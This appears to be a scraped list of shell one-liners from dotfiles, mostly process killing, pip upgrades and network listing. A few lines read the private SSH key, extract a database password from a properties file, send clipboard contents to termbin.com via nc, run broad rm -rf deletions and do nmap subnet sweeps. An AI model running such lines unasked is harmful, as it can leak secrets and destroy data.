ps aux | grep phantomjs | awk '{print }' | xargs kill -9
ps aux | grep nginx | awk '{print $2}' | xargs sudo kill -9
ps aux | grep nginx | awk '{print $1}'|xargs kill -9
ps aux | grep nginx && ps aux | grep php-fpm && ps aux | grep mysql
ps aux | grep mysql | awk '{print \$2}' | xargs sudo kill -9
ps aux | grep middleman | grep -v grep | awk
ps aux | grep ling | grep -v Chrome | grep -v grep
ps aux | grep lara | awk '{print \$2}' | sudo xargs kill -9
ps aux | grep hass | grep -v grep | awk '{print $2}'
ps aux | grep git | awk -F \'\' \'{print $2}\' | xargs -n 1 kill -9
ps aux | grep ember | awk '{print \$2}' | xargs kill -9
ps aux | grep dantopa | grep ssh-agent | awk
ps aux | grep com.huawei.gocd.* | grep -v grep | tr -s
ps aux | grep alacritty | awk '{ print $1 }' | xargs echo
ps aux | grep adobe -i | awk {'print $2'} | xargs kill
ps aux | grep -v ps | grep -v grep | grep ${USER}
ps aux | grep -ie meteor | awk '{print $2}' | xargs kill
ps aux | grep -i xterm | awk {'print $2'} | xargs kill -9
ps aux | grep -i chrome | cut -d ' ' -f2 | xargs kill -9
ps aux | grep 'unicorn' | awk '{print $2}' | xargs sudo kill -9
ps aux | grep 'rails s' | awk '{print $2}' | xargs kill -9
ps aux | grep 'coreaudio[d]' | awk '{print \$2}' | xargs sudo kill
ps aux | grep 'coreaudio[d]' | awk '{print $2}' | xargs sudo kill
ps aux | grep '[B]ackblaze' -i | awk2 | sudo xargs kill -9
ps aux | grep 'Visual\ Studio' | awk '{print \$2}' | xargs kill -9
ps aux | grep ' node' | awk '{print $2}' | xargs kill
ps aux | grep $USER | grep -v grep | grep -i --color=auto
ps aux | fzf | awk '{print \$2}' | xargs kill
ps aux | fzf | awk '{print \$2}' | xargs -r kill -9
ps aux | fzf -m | awk '{print \$2}' | xargs kill -9
ps aux | fzf -m | awk '{print $2}' | xargs kill
ps aux | fzf -m | awk '{ print \$2 }' | xargs kill -9
ps aux | awk '{ if (NR == 1 || \$8 == \
ps aux | awk 'NR == 1 || \$3 > 0'
ps aux | ag httpd && netstat -at | grep LISTEN | grep *.http
ps aux | ack elixir | awk '{print $2}' | xargs kill -9
ps aux | ack couchdb | awk '{print \$2}' | sudo xargs kill -9
ps alx|head -n1 && ps alxh|sort -nrk7|head -n 20
ps -x | canything | awk '{print \$1}' | xargs kill -9
ps -ux | grep SimpleHTTPServer | awk '{print \$2}' | xargs kill
ps -fe | grep phatnomjs | grep -v grep | awk
ps -ev | grep -i firefox | awk '{print \$12}' | awk '{for(i=1;i<=NF;i++)s+=\$i}END{print s}'
ps -ev | grep -i chromium | awk '{print \$12}' | awk '{for(i=1;i<=NF;i++)s+=\$i}END{print s}'
ps -ev | grep -i chrome | awk '{print \$12}' | awk '{for(i=1;i<=NF;i++)s+=\$i}END{print s}'
ps -eo pcpu | egrep -v '0.0|CPU' | awk '{sum+=$1}END{print sum}'
ps -elf | grep crisolo | grep Xvnc | grep -v grep
ps -ef|head -1;ps aux|sort -nrk +4|head
ps -ef|grep pmon|grep -v grep|cut -c58-
ps -ef|grep -w brownnoise | awk '{print \$2}' | xargs kill
ps -ef|grep -v grep|grep _pmon_| sort -k8
ps -ef|grep $1 |grep -v grep|awk {print
ps -efw | ag '[g]atsby develop' | awk '{print $2}' | xargs kill
ps -ef |grep $CONF_DIR |grep $LIB_DIR |grep -v grep
ps -ef | peco | awk '{ print $2 }' | xargs kill
ps -ef | mgrep -i bootstrap | awk '{print $2}' | xargs kill
ps -ef | head -n1 ; ps -efH | grep -v grep | grep -i
ps -ef | head -1;ps -ef | grep -v grep | egrep -i
ps -ef | head -1; ps -ef | grep -v grep | grep --color=auto -i $1
ps -ef | head -1; ps -ef | grep -v grep | grep --color=auto -i
ps -ef | head -1; ps -ef | grep -v grep | grep
ps -ef | grep vi | grep deepak | grep -v grep
ps -ef | grep tomcat | awk '{print $2}' | xargs kill -9
ps -ef | grep ssh | grep tun | awk '{print \
ps -ef | grep sqldeveloper | awk '/[j]ava/{print \$2}' | xargs -n1 kill; exit
ps -ef | grep nvOSd.log | grep -v grep | awk '{print \$2}'
ps -ef | grep node | awk '{ print $2 }' | xargs kill -9
ps -ef | grep nextpoint_job_daemon | grep -v grep | awk
ps -ef | grep mysqld | grep -v grep | awk
ps -ef | grep jupyter-noteboo[k] | awk '{print\$2}' | xargs kill -9
ps -ef | grep java | grep jboss | grep -v grep
ps -ef | grep java | grep -v grep | grep -v CrashPlan
ps -ef | grep java | grep -iv idea | grep -iv eclipse
ps -ef | grep java | cut -c 10-15| xargs kill -9
ps -ef | grep irssi | grep -v grep | awk ‘{print $2}’
ps -ef | grep goagent | grep -v grep | awk
ps -ef | grep defunct | grep -v grep | wc -l
ps -ef | grep defunct | grep -v grep | awk
ps -ef | grep defunc[t] | awk '{print\$2}' | xargs kill -9
ps -ef | grep client_linux_amd64 | grep -v grep | awk '{print $2}'
ps -ef | grep apache | grep -v grep | wc -l
ps -ef | grep 'ssh -f' | awk '{print $2}' | xargs kill
ps -ef | grep 'sidekiq' | awk '{print $2}' | xargs kill -9
ps -ef | grep 'master proces[s]' | awk '{print \$2}' | xargs kill -QUIT
ps -ef | grep 'emacs --daemon' | grep -v grep | awk '{ print \
ps -ef | grep '[s]sh -D localhost:1080' | awk '{print \$2}' | xargs kill -9
ps -ef | grep '[p]ts/[0-9]' | awk '{print \$2}' | xargs kill -9
ps -ef | grep '[n]ginx' | awk '{print \$2}' | xargs sudo kill -9 ; rm -rf $NGINX_HOME/logs/*
ps -ef | fzf --multi --header-lines=1 | awk '{ print $2 }' | xargs -t kill -9
ps -ef | ag master/bundles/tomcat/ | ag java | awk
ps -ef -l | grep -E '(tomcat|PPID)' | grep -v grep
ps -eaf | grep weblogic.Server | grep -v grep | awk
ps -eaf | grep -v grep | grep $WLP_SRV_NAME'$' | awk '{print \$2}'
ps -eaf | grep $OSI_SYSTEM | grep -v grep | sort -k9
ps -ea | grep openocd || openocd -f ~/workspace/Embedded/STM32/stm32-qserver.cfg
ps -ea | grep openocd > /dev/null || oocd & sleep 5 && gdbflash
ps -e | grep redshift >/dev/null 2>&1 || $(cat $HOME/data/notes/redshift) > /dev/null 2>&1 &
ps -e | grep java | awk '{print $1}' | xargs -n 1 kill
ps -e | grep -i chrome | awk '{print \$12}' | awk '{for(i=1;i<=NF;i++)s+=\$i}END{print s}'
ps -a|grep -v grep|grep -v ps|grep tail
ps -axlgww | egrep 'PPID|\!*' | grep -v grep
ps -ax | grep coreaudiod | grep sbin | cut -f2 -d ' '
ps -ax | grep -- --watch | awk '{print $1}' | xargs kill -15
ps -ax | fzf | awk '{print $1}' | xargs kill
ps -aux|grep mildner|grep mozilla|grep usr
ps -auxg | grep -v grep | grep $USER | sort
ps -aux | head -1 ; ps auxf | sort -nr -k 5 | head -10
ps -aux | head -1 ; ps auxf | sort -nr -k 3 | head -10
ps -aux | head -1 && ps -aux | grep -v grep | grep -i
ps -aux | grep px | while read n1 n2 n3 ; do sudo kill -9 $n2 ; done && ps -aux | grep px
ps -aux | grep intellij | awk '{print $2}' | xargs kill
ps -aux | grep -i 'sublime' | awk '{print $5}' | cut -d\
ps -aux | grep $USER | grep torq | awk
ps -aux | grep $(whoami) | grep -v grep | grep -v \
ps -aef|grep java|grep ${CATALINA_BASE}|awk
ps -aef | grep -v psg | grep -v grep | grep
ps -a -q | xargs --no-run-if-empty docker rm;docker image list -q | grep -v 7c09e61e9035 | xargs --no-run-if-empty docker rmi
ps -C chrome | grep chrome | awk '{print \$1}' | xargs -r kill -9
ps -Ax | grep '[n]ode'| cut -f 1 -d ' '| xargs kill
ps -AH f | grep vsftpd | egrep -v grep | egrep -v connected
ps -A | grep postgres | cut -f 1 -d ' ' | xargs sudo kill
ps -A | grep -v /Applications | grep -v /System | grep
ps ${SHOWPIDFLAGS:--auxl} | head -1 >&2; ps ${SHOWPIDFLAGS:--auxl} | grep -v grep | grep -i
prtconf -pv | grep banner-name |awk -F\' ' { print $2 } ' | head -1
printf '\033[?7l' && ps aux | sed -n 1p && ps aux | sort -b -n -k 4 | tail -n 30 && printf '\033[?7h'
printf '\033[?7l' && ps aux | sed -n 1p && ps aux | sort -b -n -k 3 | tail -n 30 && printf '\033[?7h'
printf '%.3fgb\n' $(echo $(df /dev/disk1 | grep -m2 -oP '(\d+)' | awk '{i++}i==5') ' / 1048576' | bc -l)
print -z pushd +$(dirs -v | peco | head -n1 | awk
print -l ? ${(o)history%% *} | uniq -c | sort -nr | head -n 10
print -l -- \${(o)history%% *} | uniq -c | sort -nr | head -n 10
print -l -- ${(o)history%% *} | uniq -c | sort -nr | head -n 10
print -l ${(o)history%%*} | uniq -c | sort -nr | head -n 10
print -l ${(o)history%% *} |uniq -c |sort -nr |head -10
print -l ${(o)history%% *} | uniq -c | sort -nr | head -n 50
print -l ${(o)history%% *} | uniq -c | sort -nr | head -n 30
print -l ${(o)history%% *} | uniq -c | sort -nr | head -n 20
print -l ${(o)history%% *} | uniq -c | sort -nr | head -n 10
print -l $((o)history%% *)|uniq -c|sort -nr|head -n 10
print -l $$${(o)history%% *} | uniq -c | sort -nr | head -n 20
port installed |grep -v active | gawk -F ' ' '{print$1$2}' | xargs sudo port -f uninstall
pmset -g log | grep -v Dark | grep -v Maintenance | grep -e 'Wake ' -e 'Entering'
pmset -g batt | tail -1 | cut -f2 | cut -d';' -f1
pmset -g assertions | egrep '(PreventUserIdleSystemSleep|PreventUserIdleDisplaySleep|InternalPreventDisplaySleep)'
pm2 logs --raw | bunyan -c '!this.req || this.err' -l trace -L -o short
pm2 logs --raw | bunyan -c '!this.req || this.err' -l info -L -o short
pm2 logs --raw | bunyan -c '!this.req || this.err' -l debug -L -o short
pkill -9 -f 'rb-fsevent|rails|spring|puma'
pkill -9 -f 'rb-fsevent|rails|puma|node'
piplist && pip freeze — local | grep -v ‘^\-e’ | cut -d = -f 1 | xargs -n1 pip install -U; piplist
pip3list && pip3 freeze — local | grep -v ‘^\-e’ | cut -d = -f 1 | xargs -n1 pip3 install -U; pip3list
pip3.6 list --outdated --format=freeze | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip3.6 install -U
pip3 list | cut -d ' ' -f1 | tail -n +3 | xargs -n1 pip3 install --upgrade
pip3 list --outdated | tail -n +3 | cut -f 1 -d ' ' | xargs pip3 install --upgrade
pip3 list --outdated | tail -n +3 | awk '{print $1}' | xargs pip3 install -U
pip3 list --outdated | cut -d ' ' -f1 | tail -n +3 | xargs pip3 install --upgrade
pip3 list --outdated --format=freeze | grep -v ^-e | cut -d = -f 1 | xargs -n1 pip3 install -U
pip3 list --outdated --format=freeze | grep -v -e wheel -e pip -e setuptools | cut -d= -f1 | xargs pip3 install --upgrade
pip3 list --outdated --format=freeze | grep -v '^\\-e' | cut -d = -f 1 | xargs -n1 pip3 install -U
pip3 list --outdated --format=freeze | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 sudo -H pip3 install -U
pip3 list --outdated --format=freeze | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip3 install -U --user
pip3 list --outdated --format=freeze | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip3 install -U
pip3 list --outdated --format=freeze | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip3 install --user --upgrade
pip3 list --outdated --format=freeze | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip install -U
pip3 install --upgrade pip; pip3 freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs pip3 install -U;
pip3 install --upgrade pip && pip3 freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip3 install -U
pip3 install --upgrade pip && pip3 freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip3 install --upgrade
pip3 freeze — local | grep -v ‘^\-e’ | cut -d = -f 1 | xargs -n1 pip3 install -U
pip3 freeze | cut -d = -f 1 | xargs -n 1 pip3 search | grep -B2 LATEST:
pip3 freeze --local | grep -v ^-e | cut -d = -f 1 | xargs pip3 install -U
pip3 freeze --local | grep -v '^\-e' | cut -d = -f 1|xargs -n1 pip3 install --user --upgrade
pip3 freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs pip3 install -U
pip3 freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs pip install -U
pip3 freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 sudo pip3 install -U
pip3 freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip3 uninstall -y
pip3 freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip3 install -U
pip3 freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip3 install -
pip3 freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip install -U
pip3 freeze --local | grep -v '^-e' | cut -d = -f 1 | xargs -n1 pip3 install -U
pip2.7 list --outdated --format=freeze | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip2.7 install -U
pip2 list --outdated --format=freeze | grep -v -e wheel -e pip -e setuptools | cut -d= -f1 | xargs pip2 install --upgrade
pip2 list --outdated --format=freeze | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip2 install -U
pip2 install --upgrade pip; pip2 freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs pip2 install -U;
pip2 install --upgrade pip && pip2 freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip2 install --upgrade
pip2 freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs pip2 install -U
pip2 freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs pip install -U
pip2 freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 sudo pip2 install -U
pip2 freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip2 install -U
pip2 freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip install -U
pip list | cut -d ' ' -f1 | tail -n +3 | xargs -n1 pip install --upgrade
pip list --user --outdated --format=freeze | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip install -U
pip list --user --outdated --format=freeze | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip install --user -U
pip list --outdated | cut -d ' ' -f1 | tail -n +3 | xargs pip install --upgrade
pip list --outdated --local | awk 'NR>2' | awk '{print $1}' | xargs pip install -U; deactivate; sudo softwareupdate -i -a; brew update; brew upgrade; brew cask upgrade; brew cleanup
pip list --outdated --format=freeze | grep -v '^\-e' | cut -d= -f1 | xargs -n1 pip install -U
pip list --outdated --format=freeze | grep -v '^\-e' | cut -d= -f1 | xargs -n1 pip install --ignore-installed -U
pip list --outdated --format=freeze | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 sudo pip install -U
pip list --outdated --format=freeze | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 sudo -H pip install -U
pip list --outdated --format=freeze | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip install -U --user
pip list --outdated --format=freeze | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip install -U
pip list --outdated --format=freeze | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip install --user -U
pip list --outdated --format=freeze | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip install --user --upgrade
pip list --outdated --format=freeze | grep -v '^\-e' | cut -d = -f 1 | sudo -H xargs -n1 pip install -U
pip list --outdated --format=freeze 2> /dev/null | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip install -U
pip list --local --outdated --format=freeze | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip install -U
pip install -U pip && pip freeze | grep -v 'git' | cut -d = -f 1 | xargs -n1 pip install -U
pip install --upgrade pip; pip freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs pip install -U
pip install --upgrade pip; pip freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip install -U
pip install --upgrade pip && pip freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip install -U
pip freeze — local | grep -v ‘^\-e’ | cut -d = -f 1 | xargs -n1 pip install -U
pip freeze — local | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip install -U
pip freeze | grep = | cut -d = -f 1 | xargs pip install -U
pip freeze | cut -d = -f 1 | xargs -n 1 pip search | grep -B2 'LATEST:'
pip freeze --user | grep -v '^\-e' | cut -d = -f 1 | xargs pip install -U --user
pip freeze --local | grep -v ‘^\-e’ | cut -d = -f 1 | xargs -n1 pip install -U
pip freeze --local | grep -v ^-e | cut -d = -f 1 | xargs pip install -U
pip freeze --local | grep -v '^\e' | cut -d = -f 1 | xargs pip install -U
pip freeze --local | grep -v '^\\-e' | cut -d = -f 1 | xargs -n 1 pip install -U
pip freeze --local | grep -v '^\-e' | cut -f 1 -d = | xargs pip install -U
pip freeze --local | grep -v '^\-e' | cut -d = -f 1|xargs -n1 pip install -U
pip freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs pip install -U pip
pip freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs pip install -U
pip freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 sudo pip install -U
pip freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 sudo -H pip install -U
pip freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip uninstall -y
pip freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip install -U; rm -rf ~/.pip/cache/
pip freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip install -U --user
pip freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip install -U
pip freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip install --upgrade && pip install pipdeptree > /dev/null
pip freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip install -
pip freeze --local | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 -P10 pip uninstall -y
pip freeze --local | cut -d = -f 1 | xargs -n 1 pip search | grep -B2 'LATEST:'
ping -c 3 -s 1472 `netstat -rn| grep default | tr -s ' '| cut -d ' ' -f 2`
ping -c 1 yahoo.com |md5 | head -c16 | tr '[:lower:]' '[:upper:]'; echo
pgrep -lf python| grep -i remote | sed 's/\([0-9][0-9]*\).*/\1/' | xargs kill
pgrep '[C]hrome Helper --type=renderer' | grep -v extension-process | awk '{print $1}' | xargs kill
perl -pi -e 's|||'
perl -pe 's/\e([^\[\]]|\[.*?[a-zA-Z]|\].*?\a)//g' | col -b
perl -pe 's/([0-9]+)\b/0\$1~01234567890/g' | perl -pe 's/0(?!9*~)|([0-9])(?=9*~[0-9]*?\1([0-9]))|~[0-9]*/\$2/g'
perl -ne 'print unless /\h*(#(?!\!)|;).*/ || /^\h*$/'
perl -ne 'print unless /(^|\/)((\.svn|\.hg|\.git)\/)/'
perl -i -p -e 's|[\r\n]+|\r\n|g'
perf script | /opt/flamegraph/stackcollapse-perf.pl | c++filt | /opt/flamegraph/flamegraph.pl > perf.svg
pdftk `ls -l ${LogDataPath}/log/ | grep ^d | awk '{print $9}' | sed
pdftk $(ls -l ${LogDirPath}/data/log/ | grep ^d | awk '{print $9}' | sed
pbsnodes | grep 'opteron' -A3 -B3 | grep 'state = free' -A2 -B1 | less
pbpaste | sort | uniq | pbcopy
pbpaste | sort | uniq -c | sort -r
pbpaste | sed 's/^>>> //' | sed 's/^... //' | pbcopy
pbpaste | perl -pe 's/^-[0-9]- . .. » (.*?) +(\\d+ ↵|$)/\\$ \\1/' | pbcopy
pbpaste | perl -pe 's/\r\n|\r/\n/g' | pbcopy
pbpaste | pandoc -f markdown -t html | textutil -stdin -format html -convert rtf -stdout -inputencoding UTF-8 -encoding UTF-8 | pbcopy
pbpaste | openssl aes-256-cbc -salt -a -e | base64 -b 0 | pbcopy
pbpaste | nc termbin.com 9999 | tee /dev/tty | pbcopy
pbpaste | markdown | textutil -stdin -stdout -format html -convert rtf | pbcopy
pbpaste | jq . | tee /dev/tty | pbcopy
pbpaste | d64 | gpg -d | cop
pbpaste | base64 --decode | openssl aes-256-cbc -salt -a -d | pbcopy
paste -d' ' <(du -cksh err.txt generated.file succ.txt | cut -f1) <(CLICOLOR_FORCE=1 ls -1d err.txt generated.file succ.txt && echo total) | sort -h | tail -n 50
password_entries | grep -i / | percol | sed 's/.*/\
passenger stop && ps aux | grep ruby | grep -v grep | awk
pass -c \$(find ~/.password-store/ -name '*.gpg' | cut -d'/' -f 6-15 | sed 's/.gpg//' | fzf +m)
papertrail --min-time '1 hour ago' -S 'All: Exceptions' | cut -f 4 -d ' ' | sort | uniq -c
paorph | xargs -I{} pikaur -R --noconfirm {}; paorph | xargs -I{} pikaur -R --noconfirm {}; paorph | xargs -I{} pikaur -R --noconfirm {}
pactl list sinks | grep -E '(Volume|Mute)' | tail -3
pacman -Sy | echo && pacman -Qu | wc -l | figlet
pacman -Sgg | grep blackarch | cut -d' ' -f2 | sort -u
pacman -Qlq package | grep -v '/$' | xargs du -h | sort -h
pacman -Q | cut -f 1 -d ' ' | fzf -m --preview 'yay -Si {1}' | yay -Si -
p4 opened | sed 's/#.*//' | p4 -x - where | awk '/^\// {print \$3}'
p4 fstat -T headChange ... | cut -d' ' -f3 | sort -nr | head -1
openssl x509 -pubkey -noout | openssl rsa -pubin -outform der 2>/dev/null | openssl dgst -sha256 -binary | openssl enc -base64
openssl rsa -in ~/.ssh/id_rsa | openssl base64 | tr -d '\n' | pbcopy
openssl ecparam -name secp256k1 -genkey > ~/priv.pem; openssl ec -in ~/priv.pem -outform DER | tail -c +8 | head -c 32 | xxd -p -c 32
nvim \$(git status --porcelain | grep '^\s*M\s*\S' | cut -d ' ' -f 3 | tr \
nvim \$(git show --pretty=oneline --name-status | tail --lines=+2 | grep -E '^[AM]' | cut -f2)
numall|grep pages|cut -d ' ' -f 3|getnum
npm run | grep -e '^ \w' | fzf | xargs -n 1 yarn
npm outdated --long | grep devDependencies | cut -d ' ' -f 1 | xargs -L1 -I pkgname sh -c 'npm remove --save-dev pkgname ; npm install --save-dev pkgname'
npm outdated --long | grep dependencies | cut -d ' ' -f 1 | xargs -L1 -I pkgname sh -c 'npm remove --save pkgname ; npm install --save pkgname'
npm outdated --json --depth=0 | jq --ascii-output --monochrome-output '. | keys | .[]'
npm ls -g --depth=0 | tail -n +2 | sed -E 's/.*─ (.*?)@.*/\1/g' | tr '\n' ' '
npm ls -g --depth=0 | cut -d' ' -f2 | tail -n +2 | sed '/^$/d'
node-sass --output-sytle expanded | postcss.singleline | postcss.nocomment | format.noemptylines
node --use-strict $(node --v8-options | grep harm | awk '{print $1}'| xargs)
node --use-strict $(node --v8-options | grep harm | awk '{print $1}' | xargs)
nmcli device wifi list | grep '*' | tail -n-1 | awk '{print \$2}'
nmcli con list | grep vpn | awk '{print \$1}' | sort
nmcli -f SSID device wifi list | grep -v SSID | sort | uniq
nmap -sP `/sbin/ifconfig | grep 'inet ' | awk '{print $2}' | sed -n 'n;p'`/24
nmap -sP \$(ip -o addr show | grep inet\ | grep wlp3s0 | cut -d\ -f 7)
nmap -sP $(tail -n 1 <(ip addr show|grep inet|grep -v inet6|awk
nmap -sP $(ip -o addr show | grep inet\ | grep eth | cut -d\ -f 7)
nmap -sP $(ip -o addr show | grep inet\ | grep en | cut -d\ -f 7)
nmap -sP $( hostname -I | awk '/(192|10)\./{print $1}' | sed -E 's/([0-9]*\.[0-9]*\.[0-9]*)(\.[0-9]*)/\1.1\/24/')
nl | sort -uk2 | sort -nk1 | cut -f2-
nix-store --query --requisites /run/current-system|cut -d - -f 2-|sort|uniq
ni $(rg --files | fzf -m || echo +qa)
nhistory | tail -2 | head -1 | sed s/^/#/ >> ~/.bashrc
newpasstxt | (which pbcopy && pbcopy || xclip)
networksetup -setairportpower $(networksetup -listallhardwareports | grep -A 2 'Hardware Port: Wi-Fi' | grep 'Device:' | awk '{print $2}')
netstat | grep -v localhost | grep -v stream | grep -v dgram
netstat -tanl | grep LISTEN | grep tcp4 | sort
netstat -rn | grep 10 | grep UGSc | awk
netstat -pnlt | grep -E -o -e '[0-9]+/python' | cut -d '/' -f 1 | xargs kill
netstat -nr |grep default | awk '{ print $2; }' | xargs ping
netstat -nr | grep default | head -n 1 | awk -F ' ' '{print $2}'
netstat -lpt 2> /dev/null | grep java | awk 'NR==1{print \$7}' | sed -e 's/\(.*\)\/\(.*\)/\1/'
netstat -apn | grep EST | grep :80 | wc -l
netstat -ant|grep tcp|grep -i listen|sort
netstat -anpl | grep :80 | awk {'print \$5'} | cut -d\
netstat -an |grep --colour=never '\(^Proto.*\|LISTEN\|^udp\)'
netstat -alnp | grep -i list | grep -i tcp | sort
netstat -aS |grep --colour=never '\(^Proto.*\|LISTEN\|^udp\)'
netctl list|sed 's/[* ]*//'|pick|xargs sudo netctl stop
netctl list|sed 's/[* ]*//'|pick|xargs sudo netctl start
netctl list|sed 's/[* ]*//'|pick|xargs sudo netctl enable
netctl list|sed 's/[* ]*//'|pick|xargs sudo netctl disable
netctl list|sed 's/[* ]*//'|pick|xargs netctl status
nano $(echo $(fc -ln -1) | rev | cut -d\ -f 1 | rev)
mysql -h mydbinstance.cbg4coxfme7c.us-east-2.rds.amazonaws.com -u root -p\$(locate jdbc.properties -n1 | xargs cat | tail -n1 | cut -c12-)
mr run git branch | grep '^mr\|^*' | sed s/mr\ run:\ //
mpv --really-quiet --video-unscaled=yes --ytdl-raw-options='format=best[height=720]' https://www.youtube.com/watch?v=$(wget -q http://www.hromadske.tv/ -O - | grep 'var mainstream ' | cut -d/ -f5 | cut -d\? -f1) &
mpc playlist | sort | uniq -d -c | while read song; do count=$(echo
mount|sort|column -t|ccze -A
mount | sed 's/on//g' | sed -e 's/([^()]*)//g' | column -t
mount | grep toor@ansible:/etc/ansible || sshfs toor@ansible:/etc/ansible /home/tfrancis/mounts/ansible ; code /home/tfrancis/mounts/ansible ; ssh toor@ansible
mount | grep ^/ | column -t | sort
mount | grep -E '(/dev/sd|@|ifuse)'
mount | grep -E '(/dev/nvme|@|ifuse)'
mount | column -t | grep -i /dev/[shl][dro] | sort
mosh $(doctl compute droplet list --output json | jq -r '.[] | select(.name|test(
mkdir lib | mkdir my| mv my/ lib/ | mkdir include
man $(ls /usr/share/man/man1 | shuf | head -n 1 | cut -d
make -j$(cat /proc/cpuinfo | grep processor | tail -1 | awk '{ print $NF }')
make -j $(cat /proc/cpuinfo | grep processor | wc | sed -r 's/^ +([0-9])+.*/\1/')
make -j $(cat /proc/cpuinfo | grep processor | wc | sed -r 's/^ +([0-9])+.*//')
lynx -dump -nolist ipchicken.com | perl -ne 'print unless(/\]$/ || /^\s+$/)'
ls|egrep -v linux |xargs -i- svn st - |grep ^M
lspci -nnk | grep VGA -A3 | grep in\ use | sed 's/.*in use: \(.*\)/\1/'
lsof | head -n 1 && lsof | grep vim | grep tmpl
lsof | grep 'DEL.*lib' | cut -f 1 -d ' ' | sort -u
lsof -n -F | python lsofgraph.py | unflatten -l 1 -c 6 | dot -T jpg > /tmp/a.jpg && open /tmp/a.jpg
lsof -iTCP -sTCP:LISTEN -n -P | peco | awk '{ print $2 }' | xargs kill
lsof -i:8000 | egrep -o '[0-9]+' | head -1 | xargs kill
lsof -i TCP -n | grep 5858 | awk '{print $2}' | xargs kill
lsof -i :8088 | grep LISTEN | sed 's/node[ ]*\([0-9]*\).*/\1/' | xargs kill
lsof -i :8000 | grep LISTEN | sed 's/node[ ]*\([0-9]*\).*/\1/' | xargs kill && grunt serve --webpack
lsof -i :8000 | grep LISTEN | sed 's/node[ ]*\([0-9]*\).*/\1/' | xargs kill
lsof -i -n -P | grep 'TCP\|UDP'| grep ESTABLISHED
lsof -U | grep '^tmux.*default' | sed -n 's/.*\(\/private.*$\)/\1/p' | xargs chmod 666
lsof -P -i -n | cut -f 1 -d ' '| uniq | tail -n +2
lsof +ad ./ | egrep -i reg | cut -c 9-14 | xargs -r ps
ls ~/.config/base16-shell/scripts/*.sh | shuf -n 1 | xargs -i -- echo echo 'Switching to random theme: ' {}\; source {} | bash
ls | grep -q www && DEPLOY_DIR=$(ls www | grep project-2019- | tail -n 1) && cat www/$DEPLOY_DIR/path/to/subdir/.git/HEAD
ls | grep --color=never '\.aiff' | sort | xargs -I '{}' lame -b 320 -ms '{}'
ls | grep '^d' --color=never ; ls | grep '^l' --color=never ; ls | grep '^-' --color=never
ls | cut -d'.' -f1 | sort -n | awk 'END {print}'
ls config | grep .yml.example | sed s/.example//g | xargs -I {} cp config/{}.example config/{}
ls \${LS_OPTIONS} -GRAhF | grep ':$' | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/ /' -e 's/-/|/'
ls /var/cache/pacman/pkg | sed 's/-[0-9].*//' | uniq -c | sort -g
ls /usr/bin | xargs whatis | grep -v nothing | less
ls /usr/bin /bin /sbin | sort | uniq | grep -i
ls /mnt/Shared/cd/**/*.ogg /mnt/Shared/cd/**/*.wav | shuf -n 1 | sed -e 's/ /\\ /g' | xargs chronic ffplay -loop 0 &
ls /bin /usr/bin|sort|uniq|grep -i
ls .sw* | head -1 | tee /dev/tty | xargs vim -r
ls -rt |grep -v `ls -rt|tail -1`|xargs rm -rf
ls -r db/migrate | peco | sed 's/_.*//' | xargs -I % rake db:migrate:down VERSION=%
ls -p ~/Music/ | grep -v / | fzf | xargs -I {} afplay
ls -lrathF -I . -I .. ${colorflag} | tail -n +2; ls -lha -I . -I .. | head -n 1; ls -a1 -I . -I .. | wc -l
ls -lhaF-I . -I .. ${colorflag} | grep --color=never '^d'; ls -l -I . -I .. | grep --color=never '^d' | wc -l
ls -lhaF -I . -I .. ${colorflag} | tail -n +2; ls -lha -I . -I .. | head -n 1; ls -a1 -I . -I .. | wc -l
